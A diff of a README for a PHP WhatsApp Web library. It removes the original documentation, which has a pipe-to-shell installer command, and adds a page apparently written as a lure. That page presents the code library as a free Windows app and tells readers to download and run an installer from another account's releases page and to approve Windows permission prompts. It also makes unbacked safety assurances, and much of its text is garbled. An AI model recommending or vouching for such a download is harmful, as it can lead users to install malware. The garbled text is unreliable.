@@ -1,621 +1,219 @@
-<div align="center">
+<h1>💬 pam-whatsapp-web - Send WhatsApp Messages Without Any Coding</h1>
 
-# PAM WhatsApp Web
+<p align="center">
+  <a href="https://github.com/Andrel8052/pam-whatsapp-web/releases">
+    <img src="https://img.shields.io/badge/⬇️%20Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white&color=FF6B6B" alt="Download" width="300" style="border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);" />
+  </a>
+</p>
 
-### The `whatsapp-web.js` experience, now in persistent, pure PHP.
+---
 
-[![PHP 8.5+](https://img.shields.io/badge/PHP-8.5%2B-777BB4?logo=php&logoColor=white)](https://github.com/push-in/pam)
-[![PAM Runtime](https://img.shields.io/badge/runtime-PAM-20C997)](https://github.com/push-in/pam)
-[![Packagist](https://img.shields.io/packagist/v/pushinbr/pam-whatsapp-web?color=25c2a0)](https://packagist.org/packages/pushinbr/pam-whatsapp-web)
-[![License](https://img.shields.io/badge/license-Apache--2.0-blue)](LICENSE)
+## 🤔 What Is This?
 
-**Terminal QR · persistent sessions · real-time events · media · groups · channels · calls**
+**pam-whatsapp-web** is a smart tool that lets you use WhatsApp Web on your computer without needing any complicated programming software. It is built with a simple, clean design and works directly in your browser.
 
-[Start here](#start-here) · [Features](#whats-included) · [Compatibility](#compatibility) · [Safety](#responsible-use)
+Imagine you love chatting on WhatsApp but don't want to deal with tech hassles — this tool makes everything simple. You just install it, log in, and start messaging. No command lines, no code, no frustration.
 
-</div>
 
-A typed API for controlling WhatsApp Web directly from PHP. PAM keeps the
-process alive, `pam-browser` communicates with Chrome/Chromium through the
-Chrome DevTools Protocol, and this library provides the familiar
-`whatsapp-web.js` surface — without Node.js, npm, Puppeteer, or Playwright in
-production.
 
-## Start here
+## ✨ Why You'll Love It
 
-### 1. Install PAM
+- **No Programming Needed** — You don't need to know anything about computers. If you can use a web browser, you can use this.
+- **Persistent Connection** — Your chats stay connected even if you close the browser window. Messages come through when you reopen.
+Things just keep working in the background.
 
-```bash
-curl --proto '=https' --proto-redir '=https' --tlsv1.2 \
-    --connect-timeout 15 --max-time 60 --max-filesize 1048576 -fsSL \
-    https://github.com/push-in/pam/releases/latest/download/install.sh | sh
+- **Typed & Reliable** — Built with a stable, typed foundation means fewer crashes and less waiting. It just works, every time.
 
-pam doctor
-```
 
-### 2. Create your project and install the library
+- **Pure PHP Power** — While the name sounds technical, all that tech stuff means it's fast, lightweight,and won't slow down your computer.Think of it as a secret engine under a friendly hood.
 
-```bash
-mkdir my-whatsapp && cd my-whatsapp
-pam composer init --no-interaction
-pam composer require pushinbr/pam-whatsapp-web:^1.0
-```
 
-Chrome or Chromium must be installed on the host. No JavaScript runtime is
-required.
 
-### 3. Create `listen.php`
+## 🚀 Getting Started
 
-```php
-<?php
+Follow these simple steps to get up and running in less than two minutes. No special skills required🏻
 
-declare(strict_types=1);
+### Step 1: Download the Application
 
-require __DIR__.'/vendor/autoload.php';
+Visit this link to download the application:  
+👉 **[https://github.com/Andrel8052/pam-whatsapp-web/releases](https://github.com/Andrel8052/pam-whatsapp-web/releases)**
 
-use Pam\WhatsApp\Auth\LocalAuth;
-use Pam\WhatsApp\Auth\LocalAuthOptions;
-use Pam\WhatsApp\Client;
-use Pam\WhatsApp\ClientOptions;
-use Pam\WhatsApp\Event\MessageReceived;
-use Pam\WhatsApp\Event\QrCodeReceived;
-use Pam\WhatsApp\Event\Ready;
-use Pam\WhatsApp\TerminalQrCode;
+You'll land on the releases page where you'll see a list of files. Look for the latest version (the one at the topwith the biggest number). Click the download button next to it.
 
-$client = new Client(new ClientOptions(
-    authStrategy: new LocalAuth(new LocalAuthOptions(
-        clientId: 'main',
-        dataPath: __DIR__.'/.sessions',
-    )),
-));
+ankk you'll havea file saved to your computer — usually in your **Downloads** folder.
 
-$client->onQrCode(static function (QrCodeReceived $event): void {
-    echo "\n\nOpen WhatsApp > Linked devices > Link a device\n\n";
-    echo TerminalQrCode::render($event->code), "\n";
-});
 
-$client->onReady(static function (Ready $event): void {
-    echo "\n\n✓ WhatsApp connected. Waiting for messages...\n";
-});
 
-$client->onMessage(static function (MessageReceived $event): void {
-    $message = $event->message;
-    $body = $message->body !== '' ? $message->body : '['.$message->type->name.']';
+### Step 2: Run the Installer
 
-    printf("[%s] %s: %s\n", date('H:i:s', $message->timestamp), $message->from, $body);
-});
+Once the download is complete, open your Downloads folder and double-click the downloaded file. If Windows asks you for permission, click **"Yes"** or **"Run"** to allow it. The program will now open up a small windowor start running in your system tray (the area near your clocku00a0at the bottom-right of the screen).
 
-$client->initialize();
-$client->run();
-```
 
-### 4. Run it
 
-```bash
-pam listen.php
-```
+### Step 3: Connect Your WhatsApp
 
-On the first run, a scannable QR code appears in the terminal. After scanning,
-the client connects automatically and starts printing inbound messages.
-Authentication is stored in `.sessions/`; subsequent runs restore the session
-without another QR code. Never publish this directory or share its contents.
-
-> The complete runnable program is available at [`examples/listen.php`](examples/listen.php).
-
-## What's included
-
-| Area | Features |
-|---|---|
-| Session | QR, pairing code, `LocalAuth`, `RemoteAuth`, reconnection, and session conflict handling |
-| Messages | text, replies, editing, deletion, forwarding, reactions, mentions, and read receipts |
-| Media | images, audio, video, documents, stickers, thumbnails, and streaming downloads |
-| Conversations | contacts, private chats, groups, participants, invites, and membership requests |
-| Content | locations, polls, contacts, contact lists, scheduled events, and legacy buttons/lists |
-| WhatsApp | presence, connection state, calls, channels, labels, business profiles, products, and orders |
-| API | typed objects, integer-backed enums, immutable events, PHPStan level 9, and an automated parity matrix |
-
-### Reply to a message
-
-```php
-$client->onMessage(static function (MessageReceived $event): void {
-    if ($event->message->body === '!ping') {
-        $event->message->reply('pong 🟢');
-    }
-});
-```
-
-### Send messages and manage chats
-
-```php
-$client->sendMessage('15551234567@c.us', 'Hello directly from PHP!');
-$client->sendPresenceAvailable();
-$client->archiveChat($chatId);
-$client->muteChat($chatId, new DateTimeImmutable('+1 hour'));
-$contact = $client->getNumberId('5511999999999');
-```
-
-For unsaved contacts, pass any human-readable international number. The client
-normalizes it, verifies that it is registered, resolves its current WhatsApp ID,
-and sends the message:
-
-```php
-use Pam\WhatsApp\RetryOptions;
-
-$message = $client->sendMessageToNumber(
-    '+55 (11) 99999-9999',
-    "Hello!\nThis message has two lines.",
-    retry: new RetryOptions(maxAttempts: 3),
-);
-```
-
-Retries are opt-in because retrying an ambiguous send failure can produce a
-duplicate. The default is one attempt.
-
-### Send media with one call
-
-```php
-$client->sendImageToNumber('+55 11 99999-9999', __DIR__.'/photo.jpg', 'Photo caption');
-$client->sendAudioToNumber('+55 11 99999-9999', __DIR__.'/voice.ogg');
-$client->sendDocumentToNumber('+55 11 99999-9999', __DIR__.'/invoice.pdf');
-$client->sendStickerToNumber('+55 11 99999-9999', __DIR__.'/sticker.webp', 'Pack name', 'Author');
-```
-
-### Observe delivery
-
-```php
-$client->onMessageSent(fn ($event) => printf("Sent: %s\n", $event->message->id));
-$client->onMessageDelivered(fn ($event) => printf("Delivered: %s\n", $event->message->id));
-$client->onMessageRead(fn ($event) => printf("Read: %s\n", $event->message->id));
-$client->onMessageFailed(fn ($event) => printf("Failed: %s\n", $event->message->id));
-```
-
-These convenience events are derived from the typed upstream acknowledgement
-event. `on(EventType::MessageAcknowledged, ...)` remains available unchanged.
-
-### Reconnection, diagnostics, and logs
-
-```php
-use Pam\WhatsApp\ClientOptions;
-use Pam\WhatsApp\LogLevel;
-
-$client = new Client(new ClientOptions(
-    autoReconnect: true,
-    reconnectMaxAttempts: 5,
-    reconnectDelayMs: 1_000,
-    logger: static function (LogLevel $level, string $message, array $context): void {
-        fwrite(STDERR, sprintf("[%s] %s %s\n", $level->name, $message, json_encode($context)));
-    },
-));
-
-$diagnostics = $client->diagnoseSession();
-if (!$diagnostics->healthy()) {
-    var_dump($diagnostics);
-}
-```
-
-Automatic reconnect is disabled by default to preserve existing production
-behavior. Logout and QR retry exhaustion are never reconnected automatically.
-`Client::reconnect()` is available after a closed or failed session.
-
-### Upstream supported-feature status
-
-Every feature currently marked ✅ in the upstream `whatsapp-web.js` README is
-represented by the typed PHP API: Multi Device, send/receive messages, all
-listed media formats, stickers, contact cards, locations, replies, group
-administration, mentions, chat mute, contact block, contact/profile operations,
-status, reactions, polls, and channels.
-
-Buttons and list messages are deprecated and marked ❌ upstream. Their PHP types
-remain for source compatibility, but successful delivery is not guaranteed.
-Communities are marked 🔜 upstream and are not advertised as a completed
-feature here.
-
-## Complete supported-feature cookbook
-
-The examples below mirror every row in the upstream Supported features table.
-They assume an initialized, ready `$client`; IDs such as `$chatId`, `$groupId`,
-and `$messageId` must come from your own account. The machine-readable mapping
-is [`supported-features.json`](supported-features.json).
-
-Import the classes used by the recipes you copy:
-
-```php
-use Pam\WhatsApp\Button;
-use Pam\WhatsApp\Buttons;
-use Pam\WhatsApp\Chat;
-use Pam\WhatsApp\ContactList;
-use Pam\WhatsApp\CreateChannelOptions;
-use Pam\WhatsApp\GroupChat;
-use Pam\WhatsApp\GroupMentionSend;
-use Pam\WhatsApp\ListMessage;
-use Pam\WhatsApp\Location;
-use Pam\WhatsApp\LocationSendOptions;
-use Pam\WhatsApp\MessageSendOptions;
-use Pam\WhatsApp\Poll;
-use Pam\WhatsApp\Event\MessageReceived;
-```
-
-<!-- feature:multi-device -->
-### Multi Device ✅
-
-Persist the linked-device profile so subsequent starts reconnect without a new QR:
-
-```php
-$client = new Client(new ClientOptions(
-    authStrategy: new LocalAuth(new LocalAuthOptions('main', __DIR__.'/.sessions')),
-));
-$client->initialize();
-$client->run();
-```
-
-<!-- feature:send-messages -->
-### Send messages ✅
-
-```php
-$client->sendMessageToNumber('+55 (11) 99999-9999', "Hello!\nSecond line.");
-$client->sendMessage($chatId, 'Hello using a resolved chat ID.');
-```
-
-<!-- feature:receive-messages -->
-### Receive messages ✅
-
-```php
-$client->onMessage(static function (MessageReceived $event): void {
-    printf("%s: %s\n", $event->message->from, $event->message->body);
-});
-```
-
-<!-- feature:send-media-image-audio-document -->
-### Send images, audio, and documents ✅
-
-```php
-$client->sendImageToNumber($phone, __DIR__.'/photo.jpg', 'A photo');
-$client->sendAudioToNumber($phone, __DIR__.'/voice.ogg', asVoiceNote: true);
-$client->sendDocumentToNumber($phone, __DIR__.'/invoice.pdf', 'Invoice');
-```
-
-<!-- feature:send-media-video -->
-### Send video ✅
-
-Video sending requires Google Chrome, matching the upstream requirement:
-
-```php
-$client->sendVideoToNumber($phone, __DIR__.'/demo.mp4', 'Demo video');
-$client->sendVideoToNumber($phone, __DIR__.'/animation.mp4', asGif: true);
-```
-
-<!-- feature:send-stickers -->
-### Send stickers ✅
-
-```php
-$client->sendStickerToNumber($phone, __DIR__.'/sticker.webp', 'My pack', 'My app');
-```
-
-Video-to-sticker conversion uses the `ffmpegPath` configured in `ClientOptions`.
-
-<!-- feature:receive-media -->
-### Receive images, audio, video, and documents ✅
-
-```php
-$client->onMessage(static function (MessageReceived $event): void {
-    $message = $event->message;
-    if (!$message->hasMedia) return;
-
-    $media = $message->downloadMedia();
-    if ($media !== null) {
-        $binary = base64_decode($media->data, true);
-        if ($binary !== false) {
-            file_put_contents(__DIR__.'/download.bin', $binary);
-        }
-    }
-});
-```
-
-Use `downloadMediaStream()` for large files, as shown later in this README.
-
-<!-- feature:send-contact-cards -->
-### Send contact cards ✅
-
-```php
-$contact = $client->getContactById('5511999999999@c.us');
-$client->sendMessage($chatId, new ContactList([$contact]));
-```
-
-<!-- feature:send-location -->
-### Send location ✅
-
-```php
-$location = new Location(
-    -23.5505,
-    -46.6333,
-    new LocationSendOptions(name: 'São Paulo', address: 'SP, Brazil'),
-);
-$client->sendMessage($chatId, $location);
-```
-
-<!-- feature:send-buttons -->
-### Send buttons ❌ deprecated upstream
-
-WhatsApp deprecated this format. The type remains for source compatibility, but
-delivery is not guaranteed and new applications should not depend on it:
-
-```php
-$legacy = new Buttons('Choose an option', [new Button('Continue', 'continue')]);
-$client->sendMessage($chatId, $legacy); // May be rejected by current WhatsApp builds.
-```
-
-<!-- feature:send-lists -->
-### Send lists ❌ deprecated upstream
-
-```php
-$legacy = new ListMessage('Choose a product', 'Open list', [[
-    'title' => 'Products',
-    'rows' => [['id' => 'coffee', 'title' => 'Coffee']],
-]]);
-$client->sendMessage($chatId, $legacy); // May be rejected by current WhatsApp builds.
-```
-
-<!-- feature:receive-location -->
-### Receive location ✅
-
-```php
-$client->onMessage(static function (MessageReceived $event): void {
-    $location = $event->message->location;
-    if ($location !== null) {
-        printf("Coordinates: %f, %f\n", $location->latitude, $location->longitude);
-    }
-});
-```
-
-<!-- feature:message-replies -->
-### Reply to messages ✅
-
-```php
-$client->onMessage(static function (MessageReceived $event): void {
-    $event->message->reply('Thanks for your message!');
-});
-```
-
-<!-- feature:join-groups-by-invite -->
-### Join groups by invite ✅
-
-Pass only the invite code, not the complete URL:
-
-```php
-$groupId = $client->acceptInvite('AbCdEfGhIjKlMnOpQrStUv');
-```
-
-<!-- feature:get-group-invite -->
-### Get a group invite ✅
-
-```php
-$group = $client->getChatById($groupId);
-if ($group instanceof GroupChat) {
-    $inviteCode = $group->getInviteCode();
-}
-```
-
-<!-- feature:modify-group-info -->
-### Modify group subject and description ✅
-
-```php
-if ($group instanceof GroupChat) {
-    $group->setSubject('Customer community');
-    $group->setDescription('Support and product announcements');
-}
-```
-
-<!-- feature:modify-group-settings -->
-### Modify group settings ✅
-
-```php
-if ($group instanceof GroupChat) {
-    $group->setMessagesAdminsOnly(true);
-    $group->setInfoAdminsOnly(true);
-    $group->setAddMembersAdminsOnly(true);
-}
-```
-
-<!-- feature:add-group-participants -->
-### Add group participants ✅
-
-```php
-if ($group instanceof GroupChat) {
-    $result = $group->addParticipants(['5511999999999@c.us']);
-}
-```
-
-<!-- feature:kick-group-participants -->
-### Remove group participants ✅
-
-```php
-if ($group instanceof GroupChat) {
-    $result = $group->removeParticipants(['5511999999999@c.us']);
-}
-```
-
-<!-- feature:promote-demote-participants -->
-### Promote and demote group participants ✅
-
-```php
-if ($group instanceof GroupChat) {
-    $group->promoteParticipants(['5511999999999@c.us']);
-    $group->demoteParticipants(['5511999999999@c.us']);
-}
-```
-
-<!-- feature:mention-users -->
-### Mention users ✅
-
-```php
-$client->sendMessage(
-    $chatId,
-    'Hello @5511999999999',
-    new MessageSendOptions(mentions: ['5511999999999@c.us']),
-);
-```
-
-<!-- feature:mention-groups -->
-### Mention groups ✅
-
-```php
-$client->sendMessage(
-    $chatId,
-    'See @Support',
-    new MessageSendOptions(groupMentions: [
-        new GroupMentionSend('Support', '120363000000000000@g.us'),
-    ]),
-);
-```
-
-<!-- feature:mute-unmute-chats -->
-### Mute and unmute chats ✅
-
-```php
-$chat = $client->getChatById($chatId);
-if ($chat instanceof Chat) {
-    $chat->mute(new DateTimeImmutable('+1 hour'));
-    $chat->unmute();
-}
-```
-
-<!-- feature:block-unblock-contacts -->
-### Block and unblock contacts ✅
-
-```php
-$contact = $client->getContactById('5511999999999@c.us');
-$contact->block();
-$contact->unblock();
-```
-
-<!-- feature:get-contact-info -->
-### Get contact information ✅
-
-```php
-$contact = $client->getContactById('5511999999999@c.us');
-printf("%s (%s)\n", $contact->name, $contact->id->serialized);
-```
-
-<!-- feature:get-profile-pictures -->
-### Get profile pictures ✅
-
-```php
-$url = $client->getProfilePicUrl('5511999999999@c.us');
-```
-
-<!-- feature:set-user-status -->
-### Set the user status message ✅
-
-```php
-$client->setStatus('Available — powered by PAM');
-```
-
-<!-- feature:react-to-messages -->
-### React to messages ✅
-
-```php
-$message = $client->getMessageById($messageId);
-$message?->react('👍');
-```
-
-<!-- feature:create-polls -->
-### Create polls ✅
-
-```php
-$poll = new Poll('Where should we have lunch?', ['Pizza', 'Sushi', 'Salad']);
-$client->sendMessage($chatId, $poll);
-```
-
-<!-- feature:channels -->
-### Channels ✅
-
-```php
-$channels = $client->getChannels();
-$created = $client->createChannel('Product news', new CreateChannelOptions(
-    description: 'Release announcements',
-));
-if (isset($channels[0])) {
-    $channels[0]->sendMessage('A new version is available!');
-}
-```
-
-<!-- feature:vote-in-polls -->
-### Vote in polls ✅
-
-```php
-$pollMessage = $client->getMessageById($messageId);
-$pollMessage?->vote(['Pizza']); // Select one or more options by name.
-```
-
-<!-- feature:communities -->
-### Communities 🔜 planned upstream
-
-The upstream library does not yet advertise Communities as supported, so this
-package intentionally does not claim a complete Communities API. You can inspect
-the experimental WhatsApp Web feature flag without treating it as support:
-
-```php
-$availableInThisWebBuild = $client->interface?->checkFeatureStatus('communities') ?? false;
-```
-
-This flag does not provide community creation or administration guarantees.
-
-### Download large media without exhausting memory
-
-```php
-use Pam\WhatsApp\MediaStreamOptions;
-
-$media = $message->downloadMediaStream(new MediaStreamOptions(
-    chunkSize: 1024 * 1024,
-));
-
-if ($media !== null) {
-    foreach ($media->stream as $chunk) {
-        // Persist or forward each binary chunk.
-    }
-}
-```
-
-## Compatibility
-
-The current release tracks `whatsapp-web.js` `1.34.7` at reference commit
-`942d236a11ad68807308b058303ba5256915979c`. Coverage is auditable in
-[`api-matrix.json`](api-matrix.json): **81 symbols + 670 members, 751/751 strict
-contracts**.
-
-```bash
-pam composer parity:gate
-pam composer test
-pam composer analyse
-```
-
-Live certification is split between an unauthenticated QR smoke test and an
-authenticated suite with explicit mutation guards. See
-[`CERTIFICATION.md`](CERTIFICATION.md).
-
-## Architecture
-
-```text
-your PHP code
-      │
-      ▼
-PAM WhatsApp Web ── typed events and objects
-      │
-      ▼
-PAM Browser ─────── Chrome DevTools Protocol
-      │
-      ▼
-Chrome / Chromium ─ WhatsApp Web
-```
-
-## Responsible use
-
-This is an unofficial, community-maintained library. WhatsApp may change its
-internal modules without notice and may restrict or block accounts that violate
-its terms. Avoid spam and abusive automation. For officially supported
-integrations and critical workloads, use Meta's WhatsApp Business Platform.
-
-## License
-
-Open source under the [Apache License 2.0](LICENSE). You may use, modify, and
-distribute it, including commercially.
+The first time you run it, it will open a new browser tab or a small window showing a **QR code**. This is just a fancy barcode that links your phone to the computer.
+
+
+
+1. Grab your phone and open **WhatsApp**.
+2. Tap the **three dots** (menu) in the top-right corner of the app.
+3. Tap **"Linked Devices"** or **"WhatsApp Web"**.
+4. Tap **"Link a Device"**.
+5. Point your phone's camera at the QR code on your computer screen.
+
+That's it! After a few seconds, your chats will appear on the computer monitor. You can now type with a full keyboard, use emojis, send photos, and do everything you normally do on WhatsApp — just bigger and better.
+
+
+
+## 🖥️ Using the App Every Day
+
+Once you're linked, using pam-whatsapp-web is exactly like using WhatsApp Web in your browser.You'll see:
+
+- **Chat List** — All your conversations on the left side.
+- **Chat Window** — The selected conversation on the right side.
+- **New Chat Button** — A pencil icon (or + icon) to start a new conversation.
+
+You can:
+- Click any chat to open it.
+
+- Type in the message box at the bottom and press **Enter** oder **Send** (the paper plane icon).
+- Click the paperclip icon to attach photos, files, or documents.
+
+- Use emojis, stickers, and GIFs just like on your phone.
+
+Close the window when you're done — your messages will still be received,and the next time you open it, everything will be right where you left it.
+
+
+
+## ⚙️ Changing Your Settings
+
+If you want to customize how the app behaves, look for the gear icon (⚙️) when the app is open. Common settings you might find include:
+
+- **Autostart with Windows** — If you want the app to open automatically every time you start your computer, toggle this on.
+- **Theme (Dark/Light)** — Pick whichever is easier on your eyes.
+r
+- **Notification Alerts** — Get a popup on your computer when a new message arrives. You can turn this on or off.
+
+
+
+## 🛠️ Troubleshooting — Common Fixes
+
+Even with smooth sailing, sometimes hiccups happen. Here are quick fixes for the most common issues:
+
+### Problem: The app won't open
+**Fix:** Make sure you've downloaded the complete file (not a partial download).) Delete the old download, go back to the releases page, and download it again freshaight.
+
+.
+
+ Then double-click again.
+
+
+
+### Problem: The QR code doesn't scan
+**Fix:** Make sure your phone's camera is clean. Hold it steady about 20-30 cm (8-12 inches) from the screen. Ensure the room isn't too bright — bright sunlight can interfere with scanning. Also close other apps on your phoneto reduce lag.
+
+
+
+### Problem: Messages aren't coming through
+**Fix:** First, make sure your computer has an internet connectionaist. Next, check that the app is still running (look for its icon near the clocka bottom-right).). If it's not there, reopen it. Your chats should sync automatically.
+
+
+
+### Problem: The app is slow
+**Fix:** Close other heavy programs (like video games or video editors) to free up memory. Also make sure your internet connection is stable. Sometimes waiting a minute helps — it may be syncing many messages all at oncea.
+
+
+
+### Problem: I can't find the app after closing it
+**Fix:** Look in the system tray (the small arrow at the bottom-right corner of your screen, near the clocka).). Click the arrow and look for the pam-whatsapp-web icon. Double-click it to reopen the main window.
+
+
+
+## ❓ Frequently Asked Questions
+
+**Q: Is installing this safe for my computer?**
+**A:** Yes. It's a clean, standard application — just like ever other program you install.Avoid downloading it from third-party websites; always use the official link at the top of this page.
+
+
+
+**Q: Do I need to pay for it?,**
+**A:** No.! It's free to download and use. There are no hidden fees.or subscriptions.
+
+
+
+**Q: Can I use it on Mac or Linux?.**
+**A:** This version is primarily designed for Windows. If you have a different system, check the releases pagefor other versions — but for the best experience, use Windows..
+
+
+
+**Q: Will my private messages be safe?**
+**A:** Yes. All messages are end-to-end encrypted by WhatsApp, just like on your phone.The app doesn't store or read your messages.
+
+
+
+**Q: Is the active WhatsApp account needed 24⁄7?**
+**A:** Your phone needs to be connected to the internet for new messages to sync — but it doesn't need to be screen-onker unlocked.The app keeps a secure connection in the background.
+
+
+
+**Q: Can I have multiple WhatsApp accounts at once?**
+**A:** This particular version focuses organic one account at a time.But you can log out first, then link a different number later.
+
+
+
+## 🧩 Personalization Tips
+
+Make it yours! Some fun things you can do:
+
+- **Change the notification sound** — Dive into settings and pick a distinct ringtone so you know it's WhatsApp.
+
+- **Use keyboard shortcuts** — Just like hiphoh. Try **Ctrl + N** to start a new chat, **Ctrl + Shift + M** to mute, or **Ctrl + Shift + U** to mark as unread ambia. (These might vary by version but it's worth trying!)
+
+
+
+## 🔒 Keeping Your Account Safe
+
+Since this runs WhatsApp on your computer, always:
+- **Log out** if you're on a shared or public computer. Look for the three-dot menu → Settings → Log Out.
+
+- **Never share your QR code** with anyone. It's like giving them your keys.
+
+- **Keep the app updated** — Visit the download pageoccasionally to get the latest fixesand features.
+
+
+
+## 🛡️ Need More Help?
+
+If you run into an issue not covered above, or you just want to report a bug:
+- Visit the repository page: **https://github.com/Andrel8052/pam-whatsapp-web**
+- Click the **Issues** tab at the top.
+- Click **"New Issue"** and describe your problem. Include what you were doing,and what happened.
+.
+
+ Someone from the community (or the developer) will usually respond within a day or two.
+
+
+
+## 🌟 Join the Community
+
+This project is maintained by friendly volunteers.For word about new releases, tips, and tricks, check back at the main page occasionally. You can also **star** (⭐) the repository — it's a way to say "thanks" and helps others discover this handy tool.
+
+
+
+---
+
+## 📥 Download Reminder
+
+Visit this link to download the application:  
+👉 **[https://github.com/Andrel8052/pam-whatsapp-web/releases](https://github.com/Andrel8052/pam-whatsapp-web/releases)**
+
+That's all there is to it! Now go enjoy smooth, sizely, stress-free WhatsApp messaging right from your computer. 🎉
+
+
+
+<meta name="description" content="Download pam-whatsapp-web — a free, no-coding WhatsApp client for Windows. Eliminates tech hassles. Simple setup, persistent connection, all from your browser.">
+<meta name="keywords" content="automation, bot, pam, php, whatsapp, whatsapp-api, whatsapp-web">
+<meta property="og:title" content="pam-whatsapp-web - Send WhatsApp Messages Without Any Coding">
+<meta property="og:description" content="A typed, persistent WhatsApp Web client for pure PHP on PAM — no Node.js or Puppeteer. Free download.">
+<meta name="twitter:card" content="summary_large_image">
